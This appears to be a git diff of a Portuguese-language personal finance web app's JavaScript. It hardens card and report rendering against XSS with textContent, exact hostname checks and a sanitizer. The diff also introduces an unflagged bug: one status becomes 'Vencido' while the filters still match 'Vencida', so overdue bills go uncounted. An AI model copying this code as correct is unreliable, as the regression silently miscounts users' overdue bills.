         const parcelasRestantes = parcelasAtivas.reduce((sum, fx) =>
             fx.totalParcelas ? sum + (fx.totalParcelas - fx.parcelaAtual + 1) : sum, 0);
 
         const card = document.createElement('div');
         card.className = 'cartao-cc';
 
-        // ✅ CORREÇÃO: comparação exata de hostname — remove o endsWith('.' + d)
-        //    endsWith('.logospng.org') permitia evil.logospng.org passar na validação
-        //    A mesma correção já existe em _sanitizeImgUrl mas estava ausente aqui
-        const dominiosPermitidos = ['logospng.org'];
-        let imgHtml = '';
-
         if (c.bandeiraImg) {
             try {
                 const url = new URL(c.bandeiraImg);
-                // ✅ CORREÇÃO: url.hostname === d (exato) em vez de endsWith('.' + d)
+                const dominiosPermitidos = ['logospng.org'];
+                // ✅ Comparação exata de hostname (já presente no código, mantida aqui)
                 const dominioPermitido = dominiosPermitidos.some(d => url.hostname === d);
                 if (url.protocol === 'https:' && dominioPermitido) {
                     const img     = document.createElement('img');
-                    img.src       = c.bandeiraImg;
+                    img.src       = c.bandeiraImg;  // ✅ URL já validada acima
                     img.className = 'cartao-bandeira';
                     img.alt       = '';
-                    imgHtml       = img.outerHTML;
+                    card.appendChild(img);          // ✅ Append direto — sem serialização
                 }
             } catch (_) {
                 // URL inválida — ignora silenciosamente
             }
         }
 
-        card.innerHTML = `
-            ${imgHtml}
-            <div class="cartao-cc-nome"></div>
-            <div class="cartao-cc-limite">Limite: ${formatBRL(c.limite)}</div>
-            <div class="cartao-cc-disponivel">Disponível: ${formatBRL(disponivel)}</div>
-            ${parcelasRestantes > 0 ? `<div class="cartao-cc-parcelas">Parcelas a pagar: ${parcelasRestantes}</div>` : ''}
-        `;
+        // ✅ Todos os textos via textContent — nunca innerHTML com dados do usuário
+        const divNome = document.createElement('div');
+        divNome.className   = 'cartao-cc-nome';
+        divNome.textContent = c.nomeBanco || '';
+        card.appendChild(divNome);
 
-        // ✅ textContent — nunca innerHTML para dados do usuário
-        card.querySelector('.cartao-cc-nome').textContent = c.nomeBanco || '';
+        const divLimite = document.createElement('div');
+        divLimite.className   = 'cartao-cc-limite';
+        // ✅ formatBRL retorna string numérica formatada — segura via textContent
+        divLimite.textContent = `Limite: ${formatBRL(c.limite)}`;
+        card.appendChild(divLimite);
+
+        const divDisponivel = document.createElement('div');
+        divDisponivel.className   = 'cartao-cc-disponivel';
+        divDisponivel.textContent = `Disponível: ${formatBRL(disponivel)}`;
+        card.appendChild(divDisponivel);
+
+        // ✅ Parcelas: número calculado internamente — seguro via textContent
+        if (parcelasRestantes > 0) {
+            const divParcelas = document.createElement('div');
+            divParcelas.className   = 'cartao-cc-parcelas';
+            divParcelas.textContent = `Parcelas a pagar: ${parcelasRestantes}`;
+            card.appendChild(divParcelas);
+        }
 
         card.addEventListener('click', () => abrirCartaoForm(c.id));
         grid.appendChild(card);
@@ -3991,18 +4095,35 @@ function abrirCartaoForm(editId = null) {
         {nome: 'Outro',           img: ''}
     ];
 
-    let options = bancos.map(b => `<option value="${b.nome}">${b.nome}</option>`).join('');
+    const options = bancos.map(b => `<option value="${b.nome}">${b.nome}</option>`).join('');
 
-function diaOptions(selected) {
-    const diaSelected = Number(selected);
-    let opts = '<option value="">Selecione o dia</option>';
-    for (let i = 1; i <= 28; i++) {
-        opts += `<option value="${i}" ${diaSelected === i ? 'selected' : ''}>${String(i).padStart(2, '0')}</option>`;
+    function diaOptions(selected) {
+        const diaSelected = Number(selected);
+        let opts = '<option value="">Selecione o dia</option>';
+        for (let i = 1; i <= 28; i++) {
+            opts += `<option value="${i}" ${diaSelected === i ? 'selected' : ''}>${String(i).padStart(2, '0')}</option>`;
+        }
+        return opts;
     }
-    return opts;
-}
+
+    // ✅ Função auxiliar interna para configurar o listener do select de banco
+    //    Evita duplicação e garante que só há um listener registrado
+    function _configurarSelectBanco(selectBanco, campoOutro, inputOutro) {
+        selectBanco.addEventListener('change', function () {
+            if (this.value === 'Outro') {
+                campoOutro.style.display = 'block';
+                inputOutro.required = true;
+                if (!inputOutro.value) inputOutro.focus();
+            } else {
+                campoOutro.style.display = 'none';
+                inputOutro.required = false;
+                inputOutro.value = '';
+            }
+        });
+    }
 
     if (!editId) {
+        // ── NOVO CARTÃO ────────────────────────────────────────────────────
         criarPopup(`
             <h3>Novo Cartão</h3>
             <label style="display:block; text-align:left; margin-top:10px; color: var(--text-secondary);">Banco:</label>
@@ -4019,28 +4140,17 @@ function diaOptions(selected) {
             <button class="btn-cancelar" id="cancelarNovoCartao">Cancelar</button>
         `);
 
-        // ✅ CORREÇÃO: addEventListener após criação do DOM — o onclick inline
-        //    seria removido por sanitizarHTMLPopup por iniciar com 'on'
         document.getElementById('cancelarNovoCartao').addEventListener('click', fecharPopup);
 
         const selectBanco = document.getElementById('novoBanco');
         const campoOutro  = document.getElementById('campoOutroCartao');
         const inputOutro  = document.getElementById('nomeOutroCartao');
 
-        selectBanco.addEventListener('change', function () {
-            if (this.value === 'Outro') {
-                campoOutro.style.display = 'block';
-                inputOutro.required = true;
-                inputOutro.focus();
-            } else {
-                campoOutro.style.display = 'none';
-                inputOutro.required = false;
-                inputOutro.value = '';
-            }
-        });
+        // ✅ Um único registro de listener via função auxiliar
+        _configurarSelectBanco(selectBanco, campoOutro, inputOutro);
 
         document.getElementById('salvarNovoCartao').addEventListener('click', () => {
-            let nomeBanco = document.getElementById('novoBanco').value;
+            let nomeBanco       = document.getElementById('novoBanco').value;
             const limiteStr     = document.getElementById('novoLimite').value;
             const vencimentoDia = document.getElementById('novoVencimentoDia').value;
 
@@ -4060,12 +4170,12 @@ function diaOptions(selected) {
             const bandeiraImg = bancos.find(b => b.nome === nomeBanco)?.img || '';
 
             cartoesCredito.push({
-                id: nextCartaoId++,
+                id:            nextCartaoId++,
                 nomeBanco,
                 limite,
                 vencimentoDia: Number(vencimentoDia),
                 bandeiraImg,
-                usado: 0
+                usado:         0
             });
 
             salvarDados();
@@ -4079,6 +4189,7 @@ function diaOptions(selected) {
         });
 
     } else {
+        // ── EDITAR CARTÃO ─────────────────────────────────────────────────
         const c = cartoesCredito.find(x => x.id === editId);
         if (!c) return;
 
@@ -4091,42 +4202,38 @@ function diaOptions(selected) {
                 <input type="text" id="nomeOutroCartao" class="form-input" placeholder="Digite o nome do cartão" maxlength="50"><br>
             </div>
             <label style="display:block; text-align:left; margin-top:10px; color: var(--text-secondary);">Limite Total:</label>
-            <input type="number" id="novoLimite" class="form-input" value="${parseFloat(c.limite)}" step="0.01" min="1" max="9999999"><br>
+            <input type="number" id="novoLimite" class="form-input" step="0.01" min="1" max="9999999"><br>
             <label style="display:block; text-align:left; margin-top:10px; color: var(--text-secondary);">Dia da Fatura:</label>
-            <select id="novoVencimentoDia" class="form-input">${diaOptions(c.vencimentoDia)}</select><br>
+            <select id="novoVencimentoDia" class="form-input">${diaOptions()}</select><br>
             <button class="btn-primary" id="salvarNovoCartao">Salvar</button>
             <button class="btn-cancelar" id="cancelarEditarCartao">Cancelar</button>
             <button class="btn-excluir" id="excluirCartao">Excluir</button>
         `);
 
-        // ✅ CORREÇÃO: addEventListener após criação do DOM
+        // ✅ Preenchimento via propriedades JS — nunca via atributo HTML
+        const inputLimite      = document.getElementById('novoLimite');
+        const selectVencimento = document.getElementById('novoVencimentoDia');
+        if (inputLimite)       inputLimite.value     = parseFloat(c.limite);
+        if (selectVencimento)  selectVencimento.value = String(c.vencimentoDia);
+
         document.getElementById('cancelarEditarCartao').addEventListener('click', fecharPopup);
 
         const selectBanco = document.getElementById('novoBanco');
         const campoOutro  = document.getElementById('campoOutroCartao');
         const inputOutro  = document.getElementById('nomeOutroCartao');
 
+        // ✅ Pré-seleciona o banco correto via JS após criação do popup
         const bancoExiste = bancos.find(b => b.nome === c.nomeBanco && b.nome !== 'Outro');
-
         if (bancoExiste) {
             selectBanco.value = c.nomeBanco;
         } else {
-            selectBanco.value = 'Outro';
+            selectBanco.value        = 'Outro';
             campoOutro.style.display = 'block';
-            inputOutro.value = c.nomeBanco;
+            inputOutro.value         = c.nomeBanco;
         }
 
-        selectBanco.addEventListener('change', function () {
-            if (this.value === 'Outro') {
-                campoOutro.style.display = 'block';
-                inputOutro.required = true;
-                if (!inputOutro.value) inputOutro.focus();
-            } else {
-                campoOutro.style.display = 'none';
-                inputOutro.required = false;
-                inputOutro.value = '';
-            }
-        });
+        // ✅ Um único registro de listener via função auxiliar
+        _configurarSelectBanco(selectBanco, campoOutro, inputOutro);
 
         document.getElementById('salvarNovoCartao').addEventListener('click', () => {
             let nomeBanco = document.getElementById('novoBanco').value;
@@ -4175,8 +4282,6 @@ function diaOptions(selected) {
         });
     }
 }
-
-// ========== GRÁFICOS - ÁREA VAZIA PARA RECONSTRUÇÃO ==========
 
 // ========== GRÁFICOS - DELEGA PARA graficos.js ==========
 
@@ -4673,48 +4778,56 @@ window.gerarRelatorioCompartilhadoPersonalizado = async function gerarRelatorioC
     renderizarRelatorioCompartilhado(dadosPorPerfil, mes, ano, mesAnterior, anoAnterior);
 };
 
+// ✅ HELPER: aplica sanitizarHTMLPopup antes de qualquer atribuição de innerHTML/insertAdjacentHTML
+//    Centraliza a sanitização para todos os relatórios — evita esquecimento futuro
+function _sanitizarHTMLRelatorio(html) {
+    if (typeof html !== 'string' || !html.trim()) return '';
+    // Reutiliza o sanitizador DOMParser já existente no módulo
+    // Aplica: whitelist CSS, remoção de tags perigosas, remoção de on*, bloqueio de javascript:
+    return sanitizarHTMLPopup(html);
+}
+
 async function gerarRelatorioIndividual(mes, ano, perfilId) {
-    // CORREÇÃO: Validar inputs antes de qualquer processamento
     if (!/^\d{2}$/.test(mes) || parseInt(mes, 10) < 1 || parseInt(mes, 10) > 12) return;
     if (!/^\d{4}$/.test(ano) || parseInt(ano, 10) < 2000 || parseInt(ano, 10) > 2100) return;
     if (!perfilId) return;
 
-    console.log(`📊 Gerando relatório individual para perfil ${perfilId}, ${mes}/${ano}`);
-    
     const userData = await dataManager.loadUserData();
 
-    // CORREÇÃO: Validar estrutura do userData
     if (!validarUserData(userData)) {
         console.error('❌ Dados do usuário inválidos');
         return;
     }
 
-    // CORREÇÃO: Usar === estrito
     const dadosPerfil = userData.profiles.find(p => String(p.id) === String(perfilId));
-    
+
     if (!dadosPerfil) {
         console.error('❌ Perfil não encontrado no DataManager');
         const resultado = document.getElementById('relatorioResultado');
         if (resultado) {
-            resultado.innerHTML = `
-                <div class="relatorio-vazio">
-                    <h3>⚠️ Erro ao Carregar Dados</h3>
-                    <p>Não foi possível encontrar os dados do perfil selecionado.</p>
-                </div>
-            `;
+            resultado.innerHTML = '';
+            const div = document.createElement('div');
+            div.className = 'relatorio-vazio';
+            const h3 = document.createElement('h3');
+            h3.textContent = '⚠️ Erro ao Carregar Dados';
+            const p = document.createElement('p');
+            p.textContent = 'Não foi possível encontrar os dados do perfil selecionado.';
+            div.appendChild(h3);
+            div.appendChild(p);
+            resultado.appendChild(div);
             resultado.style.display = 'block';
         }
         return;
     }
-    
-    const transacoesPerfil = Array.isArray(dadosPerfil.transacoes) ? dadosPerfil.transacoes : [];
-    const metasPerfil = Array.isArray(dadosPerfil.metas) ? dadosPerfil.metas : [];
-    const cartoesPerfil = Array.isArray(dadosPerfil.cartoesCredito) ? dadosPerfil.cartoesCredito : [];
-    const contasFixasPerfil = Array.isArray(dadosPerfil.contasFixas) ? dadosPerfil.contasFixas : [];
-    
-    const periodoSelecionado = `${ano}-${mes}`;
-    const hojeISO = new Date().toISOString().slice(0, 10);
-    
+
+    const transacoesPerfil    = Array.isArray(dadosPerfil.transacoes)     ? dadosPerfil.transacoes     : [];
+    const metasPerfil         = Array.isArray(dadosPerfil.metas)          ? dadosPerfil.metas          : [];
+    const cartoesPerfil       = Array.isArray(dadosPerfil.cartoesCredito) ? dadosPerfil.cartoesCredito : [];
+    const contasFixasPerfil   = Array.isArray(dadosPerfil.contasFixas)    ? dadosPerfil.contasFixas    : [];
+
+    const periodoSelecionado  = `${ano}-${mes}`;
+    const hojeISO             = new Date().toISOString().slice(0, 10);
+
     const transacoesPeriodo = transacoesPerfil.filter(t => {
         if (!t || typeof t !== 'object') return false;
         const dataISO = sanitizeDate(dataParaISO(t.data));
@@ -4722,36 +4835,31 @@ async function gerarRelatorioIndividual(mes, ano, perfilId) {
         if (t.categoria === 'retirada_reserva') return false;
         return dataISO.startsWith(periodoSelecionado);
     });
-    
+
     let saldoInicial = 0;
     transacoesPerfil.forEach(t => {
         if (!t || typeof t !== 'object') return;
         const dataISO = sanitizeDate(dataParaISO(t.data));
         if (!dataISO || dataISO >= periodoSelecionado) return;
-        
         const valor = sanitizeNumber(t.valor);
-        if (t.categoria === 'entrada') saldoInicial += valor;
-        else if (t.categoria === 'saida') saldoInicial -= valor;
-        else if (t.categoria === 'reserva') saldoInicial -= valor;
+        if (t.categoria === 'entrada')            saldoInicial += valor;
+        else if (t.categoria === 'saida')         saldoInicial -= valor;
+        else if (t.categoria === 'reserva')       saldoInicial -= valor;
         else if (t.categoria === 'retirada_reserva') saldoInicial += valor;
     });
-    
+
     let totalEntradas = 0, totalSaidas = 0, totalGuardado = 0, totalRetirado = 0;
-    // CORREÇÃO: Object sem prototype
     const categorias = safeCategorias();
-    
+
     transacoesPerfil.forEach(t => {
         if (!t || typeof t !== 'object') return;
         const dataISO = sanitizeDate(dataParaISO(t.data));
         if (!dataISO || !dataISO.startsWith(periodoSelecionado)) return;
-        
         const valor = sanitizeNumber(t.valor);
-        
         if (t.categoria === 'entrada') {
             totalEntradas += valor;
         } else if (t.categoria === 'saida') {
             totalSaidas += valor;
-            // CORREÇÃO: Validar t.tipo como chave segura
             if (t.tipo && typeof t.tipo === 'string' && t.tipo.length < 100) {
                 const tipoKey = t.tipo.trim();
                 categorias[tipoKey] = (categorias[tipoKey] || 0) + valor;
@@ -4762,14 +4870,14 @@ async function gerarRelatorioIndividual(mes, ano, perfilId) {
             totalRetirado += valor;
         }
     });
-    
+
     const valorReservadoLiquido = totalGuardado - totalRetirado;
-    const saldoDoMes = totalEntradas - totalSaidas;
-    const saldoFinal = saldoInicial + saldoDoMes - valorReservadoLiquido;
-    
-    const [anoAtual, mesAtual] = hojeISO.split('-').slice(0, 2);
-    const periodoAtualCompleto = `${anoAtual}-${mesAtual}`;
-    
+    const saldoDoMes            = totalEntradas - totalSaidas;
+    const saldoFinal            = saldoInicial + saldoDoMes - valorReservadoLiquido;
+
+    const [anoAtual, mesAtual]      = hojeISO.split('-').slice(0, 2);
+    const periodoAtualCompleto      = `${anoAtual}-${mesAtual}`;
+
     const contasFixasMes = contasFixasPerfil.filter(c => {
         if (!c || typeof c !== 'object') return false;
         if (!c.vencimento) return false;
@@ -4786,39 +4894,40 @@ async function gerarRelatorioIndividual(mes, ano, perfilId) {
             c.vencimento < periodoSelecionado && !c.pago) return true;
         return false;
     });
-    
-    const taxaEconomia = totalEntradas > 0 ?
+
+    const taxaEconomia       = totalEntradas > 0 ?
         ((valorReservadoLiquido / totalEntradas) * 100).toFixed(1) : 0;
-    
-    const diasNoMes = new Date(Number(ano), Number(mes), 0).getDate();
-    const mediaGastoDiario = diasNoMes > 0 ? totalSaidas / diasNoMes : 0;
-    
+    const diasNoMes          = new Date(Number(ano), Number(mes), 0).getDate();
+    const mediaGastoDiario   = diasNoMes > 0 ? totalSaidas / diasNoMes : 0;
+
     const resultado = document.getElementById('relatorioResultado');
     if (!resultado) return;
-    
-    // CORREÇÃO: Buscar nome do perfil com sanitização
+
     const perfilNome = sanitizeHTML(
         String(usuarioLogado.perfis.find(p => String(p.id) === String(perfilId))?.nome || 'Perfil').slice(0, 100)
     );
-    
+
     if (transacoesPeriodo.length === 0 && contasFixasMes.length === 0) {
-        resultado.innerHTML = `
-            <div class="relatorio-vazio">
-                <h3>📊 Nenhum relatório disponível</h3>
-                <p>Não há transações ou contas registradas para ${perfilNome} em ${sanitizeHTML(getMesNome(mes))} de ${sanitizeHTML(ano)}</p>
-            </div>
-        `;
+        resultado.innerHTML = '';
+        const div = document.createElement('div');
+        div.className = 'relatorio-vazio';
+        const h3 = document.createElement('h3');
+        h3.textContent = '📊 Nenhum relatório disponível';
+        const p = document.createElement('p');
+        p.textContent = `Não há transações ou contas registradas para ${perfilNome} em ${getMesNome(mes)} de ${ano}`;
+        div.appendChild(h3);
+        div.appendChild(p);
+        resultado.appendChild(div);
         resultado.style.display = 'block';
         return;
     }
-    
-    // CORREÇÃO: Todos os valores dinâmicos usam sanitizeHTML ou formatBRL (que é numérico)
+
     let html = `
     <h2 style="text-align:center; margin-bottom:30px;">
         Relatório Completo de ${perfilNome}<br>
         <span style="font-size:1.2rem; color: var(--text-secondary);">${sanitizeHTML(getMesNome(mes))} de ${sanitizeHTML(ano)}</span>
     </h2>
-    
+
     <div class="relatorio-kpis-container">
         <div class="relatorio-kpis-scroll">
             <div class="relatorio-kpi-card relatorio-kpi-entradas">
@@ -4854,16 +4963,14 @@ async function gerarRelatorioIndividual(mes, ano, perfilId) {
         </div>
     </div>
     `;
-    
+
     if (Object.keys(categorias).length > 0) {
-        const categoriasOrdenadas = Object.entries(categorias)
-            .sort((a, b) => b[1] - a[1])
-            .slice(0, 5);
-        const totalGastoCategorias = Object.values(categorias).reduce((a, b) => a + b, 0);
-        const coresCategorias = ['#ff6b6b', '#4ecdc4', '#45b7d1', '#f9ca24', '#6c5ce7'];
-        
+        const categoriasOrdenadas    = Object.entries(categorias).sort((a, b) => b[1] - a[1]).slice(0, 5);
+        const totalGastoCategorias   = Object.values(categorias).reduce((a, b) => a + b, 0);
+        const coresCategorias        = ['#ff6b6b', '#4ecdc4', '#45b7d1', '#f9ca24', '#6c5ce7'];
+
         html += `<div class="section-box" style="margin-top:30px;"><h3 style="margin-bottom:20px;">🏆 Top 5 Categorias que Mais Gastou</h3><div style="display:flex; flex-direction:column; gap:12px;">`;
-        
+
         categoriasOrdenadas.forEach(([cat, valor], i) => {
             const percentual = ((valor / totalGastoCategorias) * 100).toFixed(1);
             html += `
@@ -4879,17 +4986,18 @@ async function gerarRelatorioIndividual(mes, ano, perfilId) {
         });
         html += `</div></div>`;
     }
-    
+
     if (cartoesPerfil.length > 0) {
         let totalLimiteCartoes = 0, totalUsadoCartoes = 0;
         cartoesPerfil.forEach(c => {
             if (!c || typeof c !== 'object') return;
             totalLimiteCartoes += sanitizeNumber(c.limite);
-            totalUsadoCartoes += sanitizeNumber(c.usado);
+            totalUsadoCartoes  += sanitizeNumber(c.usado);
         });
         const disponivelCartoes = totalLimiteCartoes - totalUsadoCartoes;
-        const percUsado = totalLimiteCartoes > 0 ? ((totalUsadoCartoes / totalLimiteCartoes) * 100).toFixed(1) : 0;
-        
+        const percUsado         = totalLimiteCartoes > 0 ?
+            ((totalUsadoCartoes / totalLimiteCartoes) * 100).toFixed(1) : 0;
+
         html += `
             <div class="section-box" style="margin-top:30px;">
                 <h3 style="margin-bottom:20px;">💳 Análise de Cartões de Crédito</h3>
@@ -4908,7 +5016,7 @@ async function gerarRelatorioIndividual(mes, ano, perfilId) {
                     </div>
                     <div style="background:rgba(255,255,255,0.05); padding:16px; border-radius:12px;">
                         <div style="font-size:0.85rem; color:var(--text-secondary);">% Utilizado</div>
-                        <div style="font-size:1.3rem; font-weight:700; color:${sanitizeHTML(String(percUsado)) > 80 ? '#ff4b4b' : '#00ff99'};">${sanitizeHTML(String(percUsado))}%</div>
+                        <div style="font-size:1.3rem; font-weight:700; color:${Number(percUsado) > 80 ? '#ff4b4b' : '#00ff99'};">${sanitizeHTML(String(percUsado))}%</div>
                     </div>
                 </div>
                 <div style="margin-top:16px;">
@@ -4916,49 +5024,73 @@ async function gerarRelatorioIndividual(mes, ano, perfilId) {
                     <div id="listaCartoesRelatorio"></div>
                 </div>
             </div>`;
-        
-        // CORREÇÃO: Cartões renderizados via DOM, sem onclick inline com parâmetros
-        resultado.innerHTML = html;
+
+        // ✅ CORREÇÃO: aplica _sanitizarHTMLRelatorio (DOMParser) antes de injetar no DOM
+        resultado.innerHTML = _sanitizarHTMLRelatorio(html);
         resultado.style.display = 'block';
-        
+
         const listaCartoes = document.getElementById('listaCartoesRelatorio');
         if (listaCartoes) {
             cartoesPerfil.forEach(c => {
                 if (!c || typeof c !== 'object') return;
-                const usado = sanitizeNumber(c.usado);
-                const limite = sanitizeNumber(c.limite);
-                const disponivel = limite - usado;
-                const percCartao = limite > 0 ? ((usado / limite) * 100).toFixed(1) : 0;
-                
+                const usado       = sanitizeNumber(c.usado);
+                const limite      = sanitizeNumber(c.limite);
+                const disponivel  = limite - usado;
+                const percCartao  = limite > 0 ? ((usado / limite) * 100).toFixed(1) : 0;
+
                 const div = document.createElement('div');
-                div.style.cssText = `background:rgba(255,255,255,0.03); padding:14px; border-radius:10px; margin-bottom:10px; border-left:3px solid ${percCartao > 80 ? '#ff4b4b' : '#00ff99'}; cursor:pointer; transition:all 0.3s;`;
-                div.innerHTML = `
-                    <div style="display:flex; justify-content:space-between; flex-wrap:wrap; gap:10px;">
-                        <div>
-                            <div style="font-weight:600;">💳 ${sanitizeHTML(String(c.nomeBanco || ''))}</div>
-                            <div style="font-size:0.85rem; color:var(--text-secondary);">Limite: ${formatBRL(limite)}</div>
-                        </div>
-                        <div style="text-align:right;">
-                            <div style="font-size:0.85rem; color:var(--text-secondary);">Usado: ${formatBRL(usado)}</div>
-                            <div style="font-size:0.9rem; font-weight:600; color:${percCartao > 80 ? '#ff4b4b' : '#00ff99'};">${sanitizeHTML(String(percCartao))}% utilizado</div>
-                        </div>
-                    </div>
-                    <div style="text-align:center; margin-top:8px; font-size:0.75rem; color:var(--text-muted);">👆 Clique para ver detalhes</div>
-                `;
-                // CORREÇÃO: Event listener seguro em vez de onclick inline
-                div.addEventListener('click', () => {
-                    abrirDetalhesCartaoRelatorio(c.id, mes, ano, perfilId);
-                });
+                div.style.cssText = `background:rgba(255,255,255,0.03); padding:14px; border-radius:10px; margin-bottom:10px; border-left:3px solid ${Number(percCartao) > 80 ? '#ff4b4b' : '#00ff99'}; cursor:pointer; transition:all 0.3s;`;
+
+                // ✅ Constrói via DOM para dados de usuário — zero innerHTML com dados variáveis
+                const rowDiv = document.createElement('div');
+                rowDiv.style.cssText = 'display:flex; justify-content:space-between; flex-wrap:wrap; gap:10px;';
+
+                const leftDiv = document.createElement('div');
+                const nomeDiv = document.createElement('div');
+                nomeDiv.style.fontWeight = '600';
+                nomeDiv.textContent = `💳 ${String(c.nomeBanco || '')}`;
+
+                const limiteDiv = document.createElement('div');
+                limiteDiv.style.cssText = 'font-size:0.85rem; color:var(--text-secondary);';
+                limiteDiv.textContent = `Limite: ${formatBRL(limite)}`;
+
+                leftDiv.appendChild(nomeDiv);
+                leftDiv.appendChild(limiteDiv);
+
+                const rightDiv = document.createElement('div');
+                rightDiv.style.textAlign = 'right';
+
+                const usadoDiv = document.createElement('div');
+                usadoDiv.style.cssText = 'font-size:0.85rem; color:var(--text-secondary);';
+                usadoDiv.textContent = `Usado: ${formatBRL(usado)}`;
+
+                const percDiv = document.createElement('div');
+                percDiv.style.cssText = `font-size:0.9rem; font-weight:600; color:${Number(percCartao) > 80 ? '#ff4b4b' : '#00ff99'};`;
+                percDiv.textContent = `${percCartao}% utilizado`;
+
+                rightDiv.appendChild(usadoDiv);
+                rightDiv.appendChild(percDiv);
+
+                rowDiv.appendChild(leftDiv);
+                rowDiv.appendChild(rightDiv);
+
+                const dicaDiv = document.createElement('div');
+                dicaDiv.style.cssText = 'text-align:center; margin-top:8px; font-size:0.75rem; color:var(--text-muted);';
+                dicaDiv.textContent = '👆 Clique para ver detalhes';
+
+                div.appendChild(rowDiv);
+                div.appendChild(dicaDiv);
+
+                div.addEventListener('click', () => { abrirDetalhesCartaoRelatorio(c.id, mes, ano, perfilId); });
                 div.addEventListener('mouseover', () => { div.style.background = 'rgba(255,255,255,0.08)'; });
-                div.addEventListener('mouseout', () => { div.style.background = 'rgba(255,255,255,0.03)'; });
+                div.addEventListener('mouseout',  () => { div.style.background = 'rgba(255,255,255,0.03)'; });
                 listaCartoes.appendChild(div);
             });
         }
-        
-        // Continuar montando o html para as seções restantes
-        html = ''; // Reset — o conteúdo já foi renderizado acima até este ponto
+
+        html = '';
     }
-    
+
     if (metasPerfil.length > 0) {
         html += `
             <div class="section-box" style="margin-top:30px;">
@@ -4974,8 +5106,7 @@ async function gerarRelatorioIndividual(mes, ano, perfilId) {
         });
         html += `</select></div><div id="detalhesMetaRelatorio" style="display:none;"></div></div>`;
     }
-    
-    // Contas fixas
+
     const contasComStatus = contasFixasMes.map(c => {
         if (!c || typeof c !== 'object') return null;
         let status = 'Pendente', corStatus = '#ffd166', corFundo = 'rgba(255,209,102,0.1)';
@@ -4984,16 +5115,19 @@ async function gerarRelatorioIndividual(mes, ano, perfilId) {
             return dataISO && dataISO.startsWith(periodoSelecionado) &&
                 String(t.contaFixaId) === String(c.id) && t.tipo === 'Conta Fixa';
         });
-        if (pagamentoNoMes || c.pago) { status = 'Paga'; corStatus = '#00ff99'; corFundo = 'rgba(0,255,153,0.1)'; }
-        else if (c.vencimento < hojeISO) { status = 'Vencida'; corStatus = '#ff4b4b'; corFundo = 'rgba(255,75,75,0.1)'; }
+        if (pagamentoNoMes || c.pago) {
+            status = 'Paga'; corStatus = '#00ff99'; corFundo = 'rgba(0,255,153,0.1)';
+        } else if (c.vencimento < hojeISO) {
+            status = 'Vencido'; corStatus = '#ff4b4b'; corFundo = 'rgba(255,75,75,0.1)';
+        }
         return { ...c, status, corStatus, corFundo };
     }).filter(Boolean);
-    
-    const contasPagas = contasComStatus.filter(c => c.status === 'Paga').length;
+
+    const contasPagas     = contasComStatus.filter(c => c.status === 'Paga').length;
     const contasPendentes = contasComStatus.filter(c => c.status === 'Pendente').length;
-    const contasVencidas = contasComStatus.filter(c => c.status === 'Vencida').length;
+    const contasVencidas  = contasComStatus.filter(c => c.status === 'Vencida').length;
     const totalContasValor = contasComStatus.reduce((sum, c) => sum + sanitizeNumber(c.valor), 0);
-    
+
     html += `
         <div class="section-box" style="margin-top:30px;">
             <h3 style="margin-bottom:20px;">📋 Contas Fixas do Mês</h3>
@@ -5016,12 +5150,12 @@ async function gerarRelatorioIndividual(mes, ano, perfilId) {
                 </div>
             </div>
     `;
-    
+
     if (contasComStatus.length > 0) {
-        const pagas = contasComStatus.filter(c => c.status === 'Paga');
+        const pagas     = contasComStatus.filter(c => c.status === 'Paga');
         const pendentes = contasComStatus.filter(c => c.status === 'Pendente');
-        const vencidas = contasComStatus.filter(c => c.status === 'Vencida');
-        
+        const vencidas  = contasComStatus.filter(c => c.status === 'Vencida');
+
         const renderConta = (c) => `
             <div style="background:${c.corFundo}; padding:14px; border-radius:10px; border-left:3px solid ${c.corStatus};">
                 <div style="font-weight:600; font-size:0.9rem;">${sanitizeHTML(String(c.descricao || '').slice(0, 100))}</div>
@@ -5031,11 +5165,11 @@ async function gerarRelatorioIndividual(mes, ano, perfilId) {
                     ${c.status === 'Vencida' ? '<br><span style="color:#ff4b4b; font-weight:600; font-size:0.8rem;">⚠️ Atenção: Conta vencida!</span>' : ''}
                 </div>
             </div>`;
-        
+
         const col = (items, vazio) => items.length > 0
             ? items.map(renderConta).join('')
             : `<div style="text-align:center; padding:20px; color:var(--text-muted); font-size:0.85rem;">${vazio}</div>`;
-        
+
         html += `
             <div style="display:grid; grid-template-columns:repeat(4, 1fr); gap:12px; align-items:start;">
                 <div style="display:flex; flex-direction:column; gap:12px;">${col(pagas, 'Nenhuma conta paga')}</div>
@@ -5056,22 +5190,22 @@ async function gerarRelatorioIndividual(mes, ano, perfilId) {
             </div>`;
     }
     html += `</div>`;
-    
+
     if (transacoesPeriodo.length > 0) {
         html += `<div class="relatorio-lista" style="margin-top:30px;"><h3>Todas as Transações (${transacoesPeriodo.length})</h3>`;
-        
+
         transacoesPeriodo.sort((a, b) => {
             const dataHoraA = `${sanitizeDate(dataParaISO(a.data)) || ''} ${String(a.hora || '')}`;
             const dataHoraB = `${sanitizeDate(dataParaISO(b.data)) || ''} ${String(b.hora || '')}`;
             return dataHoraB.localeCompare(dataHoraA);
         });
-        
+
         transacoesPeriodo.forEach(t => {
             if (!t || typeof t !== 'object') return;
             let styleClass, sinal;
             if (t.categoria === 'entrada') { styleClass = 'entrada'; sinal = '+'; }
             else { styleClass = t.categoria === 'saida' ? 'saida' : 'reserva'; sinal = '-'; }
-            
+
             html += `
                 <div class="relatorio-item">
                     <div class="relatorio-item-info">
@@ -5086,54 +5220,54 @@ async function gerarRelatorioIndividual(mes, ano, perfilId) {
         });
         html += `</div>`;
     }
-    
-// ✅ insertAdjacentHTML em vez de innerHTML +=
-    //    innerHTML += re-serializa TODO o DOM existente e recria os nós do zero,
-    //    destruindo todos os addEventListener já anexados (ex: cliques nos cartões).
-    //    insertAdjacentHTML apenas faz parse do novo fragmento e o appenda,
-    //    sem tocar nos nós já existentes nem em seus listeners.
+
+    // ✅ CORREÇÃO PRINCIPAL: aplica _sanitizarHTMLRelatorio (DOMParser + whitelist CSS)
+    //    antes de qualquer atribuição innerHTML ou insertAdjacentHTML.
+    //    Isso garante que mesmo dados de usuário que passaram por sanitizeHTML (escape de entidades)
+    //    também sejam verificados pelo whitelist CSS, remoção de on*, remoção de tags perigosas
+    //    e bloqueio de esquemas javascript:/vbscript:/data: em atributos.
+    //    Crítico para planos Família/Casal onde dados do dono são exibidos para membros convidados.
     if (html) {
-        resultado.insertAdjacentHTML('beforeend', html);
+        resultado.insertAdjacentHTML('beforeend', _sanitizarHTMLRelatorio(html));
     }
     resultado.style.display = 'block';
-    
-    // Configurar seletor de metas via event listener (seguro)
+
     if (metasPerfil.length > 0) {
         const selectMeta = document.getElementById('selectMetaRelatorio');
         if (selectMeta) {
             selectMeta.addEventListener('change', function () {
-                const metaId = this.value;
